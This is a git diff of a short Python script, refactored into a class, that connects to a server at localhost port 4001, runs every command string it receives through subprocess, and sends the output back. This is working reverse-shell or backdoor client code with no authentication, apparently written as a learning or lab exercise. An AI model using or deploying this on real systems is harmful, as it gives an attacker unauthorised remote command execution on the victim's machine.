@@ -1,51 +1,60 @@
 #!/usr/bin/python3
+
 import socket
 import subprocess
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+class Client():
+    def __init__(self):
+        self.HOST = '127.0.0.1'
+        self.PORT = 4001
+        self.KEEP_GOING = True
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-HOST = '127.0.0.1'
-PORT = 4001
+    def print_msg(self, msg):
+        print(f'[*] {msg} [*]')
 
-def sock_exit(msg):
-    print(msg)
-    exit(1)
-
-def receive():
-    while True:
+    def send(self, output):
         try:
-            data = s.recv(1024).decode('utf-8')
-
-            if not data or data == 'q':
-                s.shutdown()
-                s.close()
-
-            print(f'Received from server: {data}')
-
-            output = handle(data)
-
-            send(output)
+            self.s.send(output.encode('utf-8'))
         except:
-            sock_exit('Failed to receive from server')
+            self.print_msg('Failed to send data to server')
+            self.KEEP_GOING = False
 
-def send(output):
-    try:
-        s.send(output.encode('utf-8'))
-    except:
-        sock_exit('Failed to send data to server')
+    def handle(self, command):
+        p = subprocess.getstatusoutput(command)
+        return p[1]
+    
+    def receive(self):
+        while self.KEEP_GOING:
+            try:
+                data = self.s.recv(1024).decode('utf-8')
 
-def handle(command):
-    p = subprocess.getstatusoutput(command)
-    return p[1]
+                if not data or data == 'q':
+                    self.s.shutdown(1)
+                    self.s.close()
 
-def main():
-    try:
-        s.connect((HOST, PORT))
-        print('Client started')
-        while True:
-            receive()
-    except:
-        print('Failed to connect to server')
+                print(f'Received from server: {data}')
+
+                output = self.handle(data)
+
+                self.send(output)
+            except:
+                self.print_msg('Failed to receive data from server')
+                self.KEEP_GOING = False
+                exit(1)
+
+    def main(self):
+        try:
+            self.s.connect((self.HOST, self.PORT))
+            self.print_msg('Client started')
+
+            while self.KEEP_GOING:
+                self.receive()
+        except:
+            self.print_msg('Failed to connect to server')
+            self.KEEP_GOING = False
 
 if __name__ == '__main__':
-    main()
+    c = Client()
+    c.main()
+
